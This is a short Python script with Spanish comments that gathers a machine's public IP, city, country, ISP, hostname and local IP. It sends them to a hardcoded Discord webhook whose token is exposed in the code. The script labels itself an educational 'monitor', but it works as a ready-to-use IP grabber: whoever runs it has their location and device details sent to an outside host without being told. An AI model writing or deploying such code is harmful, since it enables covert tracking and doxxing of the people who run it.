import requests
import socket

# Tu URL de Webhook de Discord
DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1489731254520909886/MIaawu-sNQ7psezO0M0AQ_Ylzmhv3tfwwo-CTJP_BX2roE2rrAS8iyHHwDV0YHnf9WND"

def obtener_detalles_completos():
    try:
        # 1. Obtener IP pública y datos de ubicación
        # Usamos ip-api que nos da ciudad, pais, etc.
        solicitud = requests.get('http://ip-api.com/json/').json()
        
        datos = {
            "ip_publica": solicitud.get("query", "No disponible"),
            "pais": solicitud.get("country", "No disponible"),
            "ciudad": solicitud.get("city", "No disponible"),
            "isp": solicitud.get("isp", "No disponible")
        }
        
        # 2. Obtener IP local y nombre de PC
        nombre_pc = socket.gethostname()
        datos["nombre_pc"] = nombre_pc
        datos["ip_local"] = socket.gethostbyname(nombre_pc)
        
        return datos
    except Exception as e:
        print(f"Error al obtener datos: {e}")
        return None

def enviar_a_discord():
    info = obtener_detalles_completos()
    
    if info:
        # Formateamos el mensaje para que se vea profesional en Discord
        payload = {
            "username": "Zenith X - Monitor",
            "embeds": [
                {
                    "title": "🌐 Información de Red Detectada",
                    "description": "Datos obtenidos con fines de aprendizaje de APIs.",
                    "color": 15158332, # Color rojo brillante
                    "fields": [
                        {"name": "📍 Ubicación", "value": f"{info['ciudad']}, {info['pais']}", "inline": True},
                        {"name": "🏢 Proveedor (ISP)", "value": info['isp'], "inline": True},
                        {"name": "🌐 IP Pública", "value": info['ip_publica'], "inline": False},
                        {"name": "💻 Nombre del Dispositivo", "value": info['nombre_pc'], "inline": True},
                        {"name": "🏠 IP Local", "value": info['ip_local'], "inline": True}
                    ],
                    "footer": {"text": "Sistema de monitoreo educativo - Python"}
                }
            ]
        }

        # Enviamos la información
        requests.post(DISCORD_WEBHOOK_URL, json=payload)
        print("¡Datos enviados a tu canal de Discord!")

if __name__ == "__main__":
    enviar_a_discord()
